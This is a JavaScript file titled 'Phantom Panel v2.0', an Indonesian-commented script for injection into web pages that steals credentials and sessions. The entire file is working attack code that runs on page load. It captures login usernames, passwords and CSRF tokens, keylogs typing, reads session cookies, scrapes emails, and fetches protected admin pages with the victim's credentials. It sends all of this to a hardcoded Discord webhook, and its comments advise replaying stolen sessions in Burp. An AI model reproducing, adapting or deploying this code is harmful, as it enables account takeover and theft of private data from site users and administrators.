/* ================================================================
   PHANTOM PANEL v2.0 — Universal Session & Credential Exfiltrator
   ----------------------------------------------------------------
   FITUR:
   1. Discord embed notification (rapi: judul, field, warna, timestamp)
   2. PATH TRACKER      -> ketahuan URL login admin yang asli
   3. FORM GRABBER      -> username + password + CSRF token
   4. KEYLOGGER         -> backup semua ketikan (base64)
   5. COOKIE SCANNER    -> PHPSESSID / session id lain (kalau non-HttpOnly)
   6. PAGE INTELLIGENCE -> email, CSRF token, indikator admin di halaman
   7. SESSION RIDING    -> baca halaman login-protected (JALAN walau HttpOnly)
   ================================================================ */
(function(){
  "use strict";

  /* ================= KONFIGURASI ================= */
  var WH    = "https://discord.com/api/webhooks/1516627039753605140/8VNqYb-cIYMLTg4dBoS1g2exxqGa4I51eQb8fU-xo9l8x1U2AjQR7Bs7MCkyQFrPR_GV";
  var BOT   = "Phantom Panel";                 // nama bot di Discord
  var COLOR = 0xED4245;                        // merah (embed default)

  // Nama-nama session cookie yang umum (auto-detect, case-insensitive)
  var SESSION_COOKIES = [
    "PHPSESSID","JSESSIONID","ASP.NET_SessionId","sessionid",
    "connect.sid","token","auth","sid","SESSION","ci_session","laravel_session"
  ];

  // Endpoint yang dicoba di-session-ride (baca walau cookie HttpOnly)
  var RIDE = ["/admin","/admin/","/admin/index.php","/admin/dashboard.php",
              "/panel","/dashboard","/profile","/account","/home"];

  /* ================= UTIL ================= */
  function b64e(s){ try{ return btoa(unescape(encodeURIComponent(s))); }catch(e){ return s; } }
  function b64d(s){ try{ return decodeURIComponent(escape(atob(s))); }catch(e){ return s; } }
  function ts(){ return new Date().toISOString(); }
  function trunc(s,n){ s=String(s||''); return s.length>n ? s.slice(0,n-3)+"..." : s; }
  function esc(s){ return String(s||"").replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;"); }

  /* ================= DISCORD SENDER (queue + rate-limit aman) ================= */
  var queue = [], busy = false;
  function pump(){
    if(!queue.length){ busy=false; return; }
    busy = true;
    var body = queue.shift();
    fetch(WH, {method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify(body)})
      .catch(function(){});
    setTimeout(pump, 1200);   // Discord max ~5 msg/5 detik -> 1 msg/detik aman
  }
  function pushEmbed(title, desc, fields, color){
    var emb = {title: trunc(title,256), color: color||COLOR, timestamp: ts()};
    if(desc) emb.description = trunc(desc, 4000);
    if(fields && fields.length){
      emb.fields = fields.slice(0,25).map(function(f){
        return {name: trunc(f.name||"",256), value: trunc(f.value||"\u200b",1024), inline: !!f.inline};
      });
    }
    var payload = {username: BOT, embeds:[emb]};
    queue.push(payload);
    if(!busy) pump();
  }

  /* ================= PATH TRACKER ================= */
  function isInteresting(p){
    return /(login|signin|admin|panel|dashboard|account|profile|password|passwd|user|setting|session|auth)/i.test(p);
  }
  function trackPath(){
    var p = location.pathname + location.search;
    try{
      var last = localStorage.getItem("__pt");
      if(last !== p){
        localStorage.setItem("__pt", p);
        if(isInteresting(p)){
          pushEmbed("📍 Navigasi", "Halaman menarik dibuka admin", [
            {name:"Host",  value:esc(location.hostname),   inline:true},
            {name:"Path",  value:esc(p),                   inline:true},
            {name:"Referrer", value:esc(document.referrer||"-"), inline:false}
          ], 0x5865F2);
        }
      }
    }catch(e){
      if(isInteresting(p)) pushEmbed("📍 Navigasi", "Path: "+esc(p), [], 0x5865F2);
    }
  }

  /* ================= COOKIE SCANNER (session id) ================= */
  function grabCookies(reason){
    var raw = document.cookie || "";
    if(!raw) return;
    var parts = raw.split(";").map(function(c){ return c.trim(); }).filter(Boolean);
    if(!parts.length) return;

    var found = [], others = [];
    parts.forEach(function(p){
      var i = p.indexOf("=");
      var name = i>-1 ? p.slice(0,i).trim() : p;
      var val  = i>-1 ? p.slice(i+1).trim() : "";
      var isSession = SESSION_COOKIES.some(function(s){
        return name.toLowerCase().indexOf(s.toLowerCase()) > -1;
      });
      (isSession ? found : others).push({name:name, val:val});
    });

    if(found.length){
      pushEmbed("🎯 SESSION ID TERDETEKSI ("+reason+")",
        "Session cookie **berhasil dibaca** → berarti TIDAK HttpOnly. Tinggal replay di Burp.",
        found.map(function(c){ return {name:"🍪 "+c.name, value:"```"+esc(c.val)+"```", inline:false}; }),
        0xED4245);
    } else if(others.length){
      pushEmbed("🍪 Cookies ("+reason+")",
        "Hanya cookie non-session yang kebaca. **Session utama kemungkinan HttpOnly** — JS nggak bisa baca nilainya, tapi session riding tetap jalan (lihat embed SESSION RIDING).",
        others.slice(0,8).map(function(c){ return {name:c.name, value:esc(c.val), inline:false}; }),
        0xFEE75C);
    }
  }

  /* ================= FORM GRABBER + ANALYZER ================= */
  function analyzeForm(f){
    var inputs = f.querySelectorAll("input, textarea, select");
    var user=null, pass=null, hidden=[], extra=[];
    for(var i=0;i<inputs.length;i++){
      var el = inputs[i];
      var tp = (el.type||"text").toLowerCase();
      var nm = el.name || el.id || "";
      var v  = el.value || "";
      if(tp === "password" && !pass) pass = {name:nm, val:v};
      else if(!user && (tp==="email"||tp==="text"||tp==="tel"||tp==="username") &&
              /(user|login|email|mail|phone|nama|name)/i.test(nm)) user = {name:nm, val:v};
      else if(tp === "hidden" && v) hidden.push({name:nm, val:v});
      else if(v && !(tp==="button"||tp==="submit"||tp==="image"||tp==="reset"||tp==="file"))
        extra.push({name:nm||"(no-name)", val:v});
    }
    return {user:user, pass:pass, hidden:hidden, extra:extra};
  }

  function grabForm(f, evType){
    var a = analyzeForm(f);
    if(!a.user && !a.pass && !a.hidden.length && !a.extra.length) return;

    var fields = [];
    if(a.user) fields.push({name:"👤 Username", value:esc(a.user.val), inline:true});
    if(a.pass) fields.push({name:"🔑 Password", value:esc(a.pass.val), inline:true});
    a.hidden.slice(0,4).forEach(function(h){
      fields.push({name:"🧩 "+h.name, value:esc(h.val), inline:true});
    });
    a.extra.slice(0,4).forEach(function(x){
      fields.push({name:"📎 "+x.name, value:esc(x.val), inline:true});
    });

    pushEmbed("🛡️ KREDENSIAL TERTANGKAP ("+evType+")",
      "Form login di **"+esc(location.hostname+location.pathname)+"**",
      fields, 0xED4245);

    // Backup mentah base64 — biar nggak ada field yang kelewat
    var raw = [];
    if(a.user) raw.push(a.user.name+"="+a.user.val);
    if(a.pass) raw.push(a.pass.name+"="+a.pass.val);
    a.hidden.forEach(function(h){ raw.push(h.name+"="+h.val); });
    a.extra.forEach(function(x){ raw.push(x.name+"="+x.val); });
    if(raw.length){
      pushEmbed("📦 RAW (base64)", "Decode di CyberChef → recipe: From Base64", [
        {name:"Data", value:"```"+b64e(raw.join("&"))+"```", inline:false}
      ], 0x5865F2);
    }
  }

  document.addEventListener("submit", function(e){ grabForm(e.target, "submit"); }, true);
  document.addEventListener("change", function(e){
    var t = e.target;
    if(!t || (t.tagName!=="INPUT" && t.tagName!=="TEXTAREA" && t.tagName!=="SELECT")) return;
    var f = t.form || t.closest("form");
    if(f && f.querySelector("input[type=password]")) grabForm(f, "change");
  }, true);

  /* ================= KEYLOGGER ================= */
  var kb = [], kt = null;
  document.addEventListener("keydown", function(e){
    var k = e.key;
    var map = {Enter:"[ENT]", Backspace:"[BS]", Tab:"[TAB]", Shift:"[SHIFT]",
               Control:"[CTRL]", Alt:"[ALT]", CapsLock:"[CAPS]",
               ArrowUp:"[UP]", ArrowDown:"[DOWN]", ArrowLeft:"[LEFT]", ArrowRight:"[RIGHT]",
               Escape:"[ESC]", Delete:"[DEL]", Home:"[HOME]", End:"[END]"};
    if(map[k]) k = map[k];
    else if(k && k.length>1) k = "["+k.toUpperCase()+"]";
    kb.push(k);
    if(kb.length>=40) flushKeys();
    else { clearTimeout(kt); kt = setTimeout(flushKeys, 4000); }
  });
  function flushKeys(){
    if(!kb.length) return;
    var d = kb.join(""); kb = [];
    pushEmbed("⌨️ Keylog", "Ketikan di **"+esc(location.pathname)+"**", [
      {name:"Isi (base64)", value:"```"+b64e(d)+"```", inline:false},
      {name:"Decode", value:"```"+b64d(d).slice(0,900)+"```", inline:false}
    ], 0xFEE75C);
  }

  /* ================= PAGE INTELLIGENCE ================= */
  function pageIntel(){
    var txt = document.body ? document.body.innerText : "";
    if(!txt) return;
    var hits = [];
    var mails = txt.match(/[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}/g);
    if(mails) mails.slice(0,5).forEach(function(m){
      hits.push({name:"📧 Email", value:esc(m), inline:true});
    });
    var meta = document.querySelector('meta[name="csrf-token"], meta[name="csrf"], meta[name="_token"]');
    if(meta && meta.content) hits.push({name:"🧩 CSRF token", value:esc(meta.content), inline:false});
    var ci = document.querySelector('input[name="csrf_token"], input[name="csrf"], input[name="_token"], input[name="__RequestVerificationToken"]');
    if(ci && ci.value) hits.push({name:"🧩 CSRF (input)", value:esc(ci.value), inline:false});
    if(/admin|panel|dashboard|console/i.test(location.pathname)){
      var m = txt.match(/(username|user|admin|email)[:\s]+([A-Za-z0-9._@-]+)/gi);
      if(m) m.slice(0,5).forEach(function(x){
        hits.push({name:"ℹ️ Indikator", value:esc(x), inline:true});
      });
    }
    if(hits.length) pushEmbed("🕵️ Intel Halaman", "Ditemukan dari **"+esc(location.href)+"**", hits, 0x5865F2);
  }

  /* ================= SESSION RIDING (baca halaman protected — jalan walau HttpOnly) ================= */
  function ride(){
    var sent = 0;
    RIDE.forEach(function(p){
      if(sent >= 3) return;
      try{
        fetch(p, {method:"GET", credentials:"include"})
          .then(function(r){ return r.text(); })
          .then(function(html){
            if(!html) return;
            var title = (html.match(/<title[^>]*>([^<]*)<\/title>/i)||[])[1] || "";
            var text = html.replace(/<[^>]+>/g," ").replace(/\s+/g," ").trim();
            var interesting = /(welcome|selamat datang|dashboard|logout|profile|admin panel)/i.test(text)
                            || /(admin|dashboard|panel|logout)/i.test(title);
            if(interesting){
              sent++;
              pushEmbed("🔓 SESSION RIDING OK", "Halaman protected kebaca — **cookie HttpOnly tetap dipakai otomatis oleh browser**", [
                {name:"URL", value:esc(p), inline:false},
                {name:"Title", value:esc(title||"-"), inline:false},
                {name:"Ringkasan", value:esc(text.slice(0,500)), inline:false}
              ], 0x57F287);
            }
          })
          .catch(function(){});
      }catch(e){}
    });
  }

  /* ================= INIT ================= */
  function init(){
    trackPath();
    grabCookies("load");
    pageIntel();
    setTimeout(ride, 1500);            // coba baca halaman protected

    window.addEventListener("pagehide", function(){
      flushKeys();
      grabCookies("pagehide");         // nangkep session cookie BARU setelah login
    });
    document.addEventListener("visibilitychange", function(){
      if(document.visibilityState === "visible") grabCookies("visible");
    });
  }
  if(document.readyState === "loading") document.addEventListener("DOMContentLoaded", init);
  else init();
})();
